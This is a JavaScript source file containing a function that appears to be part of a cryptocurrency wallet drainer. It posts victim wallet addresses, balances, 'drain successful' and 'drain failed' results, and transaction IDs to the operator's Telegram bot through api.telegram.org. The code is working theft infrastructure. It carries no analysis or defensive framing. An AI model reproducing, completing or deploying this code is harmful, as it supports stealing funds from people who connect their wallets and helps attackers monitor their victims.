export const sendTelegramLog = async (event, data) => {
  try {
    const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
    
    if (!botToken || !chatId) return;
    
    const emojis = {
      connected_empty: '🟡',
      connected_funded: '🟢',
      drain_success: '💰',
      drain_failed: '❌',
      mobile_user: '📱'
    };
    
    const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(-4)}` : 'unknown';
    
    let message = '';
    
    switch(event) {
      case 'connected_empty':
        message = `${emojis[event]} Wallet Connected (Empty)
Wallet: ${formatAddress(data.address)}
Type: ${data.walletType}
Balance: ${data.balance} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'connected_funded':
        message = `${emojis[event]} Wallet Connected (Funded)
Wallet: ${formatAddress(data.address)}
Type: ${data.walletType}
Balance: ${data.balance} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
Eligible: ${data.eligibleAmount} SOL
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'drain_success':
        message = `${emojis[event]} Drain Successful
Wallet: ${formatAddress(data.address)}
Amount: ${data.amount} SOL
TX: ${data.tx?.slice(0,8)}...
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'drain_failed':
        message = `${emojis[event]} Drain Failed
Wallet: ${formatAddress(data.address)}
Error: ${data.error}
Time: ${new Date().toLocaleTimeString()}`;
        break;
    }
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
  } catch (error) {
    console.error('Telegram logging failed:', error);
  }
};
